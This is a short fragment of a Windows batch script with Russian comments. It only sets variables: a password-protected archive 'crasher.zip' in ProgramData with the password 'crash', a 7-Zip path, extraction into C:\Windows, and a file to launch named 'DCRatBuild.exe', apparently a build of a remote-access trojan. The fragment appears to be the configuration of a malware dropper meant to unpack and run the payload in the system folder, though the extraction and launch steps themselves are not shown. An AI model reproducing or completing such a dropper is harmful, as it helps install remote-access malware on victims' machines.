...
set "zip_file=C:\ProgramData\crasher.zip"   REM Путь к ZIP-архиву
set "output_dir=C:\Windows"  REM Папка для распакованных файлов
set "password=crash" REM Пароль к архиву
set "sevenzip_path=C:\ProgramData\7z.exe" REM Путь к 7-Zip
set "target_file=DCRatBuild.exe"   REM Имя файла для запуска
